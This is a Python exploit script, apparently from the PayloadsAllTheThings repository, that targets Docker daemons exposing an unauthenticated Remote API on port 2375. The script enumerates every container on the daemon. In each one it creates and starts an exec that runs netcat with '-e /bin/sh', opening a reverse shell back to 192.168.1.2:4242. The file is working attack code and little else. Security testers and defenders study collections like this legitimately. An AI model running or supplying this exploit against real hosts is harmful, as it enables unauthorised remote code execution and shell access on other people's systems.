{
    "code": "from __future__ import print_function\nimport requests\nimport logging\nimport json\nimport urllib.parse\n\n# NOTE\n# Enable Remote API with the following command\n# /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock\n# This is an intended feature, remember to filter the port 2375..\n\nname          = \"docker\"\ndescription   = \"Docker RCE via Open Docker API on port 2375\"\nauthor        = \"Swissky\"\n\n# Step 1 - Extract id and name from each container\nip   = \"127.0.0.1\"\nport = \"2375\"\ndata = \"containers/json\"\nurl  = \"http://{}:{}/{}\".format(ip, port, data)\nr = requests.get(url)\n\nif r.json:\n    for container in r.json():\n        container_id   = container['Id']\n        container_name = container['Names'][0].replace('/','')\n        print((container_id, container_name))\n\n        # Step 2 - Prepare command\n        cmd = '[\"nc\", \"192.168.1.2\", \"4242\", \"-e\", \"/bin/sh\"]'\n        data = \"containers/{}/exec\".format(container_name)\n        url = \"http://{}:{}/{}\".format(ip, port, data)\n        post_json = '{ \"AttachStdin\":false,\"AttachStdout\":true,\"AttachStderr\":true, \"Tty\":false, \"Cmd\":'+cmd+' }'\n        post_header = {\n            \"Content-Type\": \"application/json\"\n        }\n        r = requests.post(url, json=json.loads(post_json))\n\n\n        # Step 3 - Execute command\n        id_cmd = r.json()['Id']\n        data = \"exec/{}/start\".format(id_cmd)\n        url = \"http://{}:{}/{}\".format(ip, port, data)\n        post_json = '{ \"Detach\":false,\"Tty\":false}'\n        post_header = {\n            \"Content-Type\": \"application/json\"\n        }\n        r = requests.post(url, json=json.loads(post_json))\n        print(r)",
    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
    "file": "CVE Exploits/Docker API RCE.py",
    "license": "MIT",
    "language": "python"
}